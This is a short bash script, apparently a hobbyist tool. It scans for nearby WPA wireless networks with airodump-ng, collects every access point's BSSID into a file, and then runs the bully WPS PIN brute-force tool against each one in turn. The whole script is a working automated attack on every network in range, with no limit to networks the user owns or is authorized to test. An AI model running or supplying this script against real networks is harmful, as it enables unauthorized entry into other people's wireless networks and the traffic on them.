#get_mac_add {
#airodump-ng wlp6s0 --enc wpa 

#}



echo -e ""
echo -e ".::[ \e[1;31m Wireless Scann \e[0m ]::."
echo -e ""
echo -e "  COMMAND LINE ARGUMENTS"
echo -e "  \e[1;34mS\e[0m   => Scann Wireless"
echo -e "  \e[1;34mInterface  \e[0m   => Scann Wireless"
read int

airodump-ng $int --enc wpa --update 3 --output-format netxml -w output &&
grep BSSID output-* | cut -d">" -f 2|cut -d"<" -f 1 | tac > mac_add.txt
rm output-*

bully=`which bully`
mac_file=mac_add.txt
echo -e "\e[1;31m `wc -l $mac_file` \e[0m "
echo -e "\e[1;31m Func : \e[0m $mac_file"

for i in `cat $mac_file` ; do 
  echo ""
  echo ""
  echo -e "\e[1;31mESSID = \e[0m$i"
  echo -e "\e[1;34m----------------------------------------------------------\e[0m "

  $bully $int -b $i 
  #| grep --color=auto "[+|X|\!]"

  sleep 1s

done

